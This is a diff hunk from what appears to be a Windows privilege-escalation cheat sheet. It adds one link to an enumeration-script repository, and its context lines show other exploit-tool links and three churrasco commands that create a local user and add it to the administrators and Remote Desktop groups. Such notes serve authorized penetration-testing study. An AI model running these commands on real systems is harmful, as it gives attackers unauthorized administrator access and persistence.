@@ -107,6 +107,7 @@ Priv Esc - Windows
  - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
  - https://github.com/M4ximuss/Powerless
  - https://github.com/sagishahar/lpeworkshop
+ - https://github.com/411Hall/JAWS
  - c:\Inetpub>churrasco -d "net user /add <username> <password>"
  - c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
  - c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
